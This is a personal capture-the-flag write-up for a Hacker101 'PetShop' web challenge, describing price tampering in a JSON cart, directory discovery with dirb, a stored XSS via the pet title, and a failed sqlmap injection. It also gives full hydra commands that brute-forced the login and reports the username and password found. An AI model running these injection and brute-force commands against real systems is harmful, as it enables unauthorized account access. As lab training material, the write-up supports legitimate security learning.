# PetShop CTF

## flag0 found

The checkout accepted a JSON of the cart. So you could set the price to 0 and

## Web crawling and directory brute force:

The hint for the next flag was that there was an admin page and after trying some guesses I tried to find tools to search the site for other pages.

I tried Metasploit with the below module and wmap but i could not get it to work but I did not try very hard.
https://github.com/flibustier/metasploit-framework/blob/master/documentation/modules/auxiliary/scanner/http/crawler.md

I also tried recon-ng and explored the below modules but none seemed to do what I wanted on the surface.
recon/domains-contacts/metacrawler
recon/domains-domains/brute_suffix
recon/domains-hosts/brute_hosts
recon/domains-vulnerabilities/xssed
recon/domains-vulnerabilities/ghdb

I finally found dirb which was a simple tool that worked like a charm, it found the following paths:

/edit
/login

Of course!!

## flag1 found

/edit title with a script tag and view cart.

It was possible to do an XSS attack on the pet title which would show up on the landing and cart page. So setting a script on the name and then viewing it in the cart showed the flag.

## flag2 not found

/login I needed to get into the cms.

Sql injection was attempted with the below command but it did not work.
sqlmap -u https://c4858c57522b16e943eb970e26bb51cf.ctf.hacker101.com/login --data "username=a&password=b" -p username --dump

Used hydra with the built in word lists in kali linux to brute force the login.

This is taking a long time :D.

I am trying to get the username first and then the password afterwards.

hydra -L /usr/share/wordlists/john.lst -p aaa c4858c57522b16e943eb970e26bb51cf.ctf.hacker101.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid username" -S -F -V -R

I tried both fasttrack and john work lists and they both do not work.

So I increased the number of tasks and chose the rockyou word list instead.

hydra -L /usr/share/wordlists/rockyou.txt -p aaa c4858c57522b16e943eb970e26bb51cf.ctf.hacker101.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid username" -S -F -t 64

Username found: ainsley
Time to username: 33 minutes

hydra -l ainsley -P /usr/share/wordlists/rockyou.txt aeb3b9c5344b3adaee6084ce9ad86eca.ctf.hacker101.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid password" -S -F -t 64

Password found: shark
Time to password: 31 minutes
